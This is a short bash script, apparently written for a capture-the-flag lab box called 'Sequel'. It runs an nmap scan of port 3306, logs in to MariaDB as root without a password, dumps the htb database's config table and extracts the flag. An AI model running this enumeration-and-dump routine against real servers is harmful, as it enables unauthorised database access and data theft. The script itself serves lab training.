#!/usr/bin/env bash
#
# enum-mysql.sh – Scan and enumerate MariaDB on the Sequel box to pull the flag
# Usage: ./enum-mysql.sh <TARGET_IP>

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 <TARGET_IP>"
  exit 1
fi

TARGET=$1
OUTDIR="artifacts-mysql"
MYSQL="mysql --ssl -h $TARGET -u root --skip-ssl"

mkdir -p "$OUTDIR"

echo "[*] Scanning port 3306 on $TARGET..."
nmap -p 3306 -sV "$TARGET" -oN "$OUTDIR/nmap-3306.txt"

echo "[*] Testing MySQL connection (skipping SSL)..."
if $MYSQL -e "QUIT" &>/dev/null; then
  echo "[✔] Connected without password"
else
  echo "[!] Connection failed or requires auth"
  exit 1
fi

echo "[*] Listing databases..."
echo "SHOW DATABASES;" | $MYSQL > "$OUTDIR/databases.txt"

echo "[*] Selecting htb and listing tables..."
echo -e "USE htb;
SHOW TABLES;" | $MYSQL > "$OUTDIR/tables.txt"

echo "[*] Dumping config table..."
echo -e "USE htb;
SELECT * FROM config;" | $MYSQL > "$OUTDIR/config.txt"

echo "[*] Extracting flag..."
FLAG=$(grep -E "flag" "$OUTDIR/config.txt" | awk '{print $NF}')
if [[ -n "$FLAG" ]]; then
  echo "[*] Flag: $FLAG"
else
  echo "[!] Flag not found in config.txt"
fi

echo "[*] All artifacts saved to $OUTDIR/"
